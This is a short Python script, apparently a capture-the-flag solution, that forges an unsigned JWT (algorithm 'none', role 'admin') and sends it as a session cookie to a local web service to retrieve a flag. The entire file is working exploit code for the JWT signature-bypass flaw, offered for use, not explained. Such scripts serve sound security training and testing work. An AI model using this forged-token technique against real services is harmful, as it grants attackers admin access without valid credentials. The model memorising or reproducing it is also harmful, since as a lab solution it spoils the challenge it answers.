#!/usr/bin/env python3
import requests
import json
import base64
import re

BASE_URL = "http://127.0.0.1:5003"

def base64url_encode(data):
    if isinstance(data, dict):
        data = json.dumps(data, separators=(',', ':'))
    if isinstance(data, str):
        data = data.encode('utf-8')
    return base64.urlsafe_b64encode(data).decode('utf-8').rstrip('=')

# Craft unsigned JWT
header = {"alg": "none", "typ": "JWT"}
payload = {"username": "user", "role": "admin"}
jwt_token = f"{base64url_encode(header)}.{base64url_encode(payload)}."

print(f"Unsigned JWT: {jwt_token}")

# Get flag
response = requests.get(f"{BASE_URL}/gettheflag", cookies={"session": jwt_token})
print(f"Status: {response.status_code}")
print(response.text)

flag = re.search(r'FLAG\{[^}]+\}', response.text)
if flag:
    print(f"\nFLAG: {flag.group(0)}")

